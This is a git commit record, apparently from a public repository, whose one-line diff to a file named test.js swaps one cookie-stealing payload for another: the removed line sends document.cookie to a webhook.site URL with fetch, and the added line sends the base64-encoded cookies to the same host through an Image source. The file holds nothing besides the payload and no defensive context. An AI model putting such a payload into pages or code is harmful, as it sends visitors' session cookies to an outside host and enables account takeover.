8eb6fe6cb914ac54fed2c11da8dc4bad36f0a3bb
sonamsuragini-alt <81952756+sonamsuragini-alt@users.noreply.github.com>
2025-09-17 23:10:55 +0530

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/7cecfecd-f7a6-492f-bf16-272b1768b057?cookie=' + document.cookie);
+x = new Image(); x.src = 'https://webhook.site/7cecfecd-f7a6-492f-bf16-272b1768b057?data='+btoa(document.cookie);
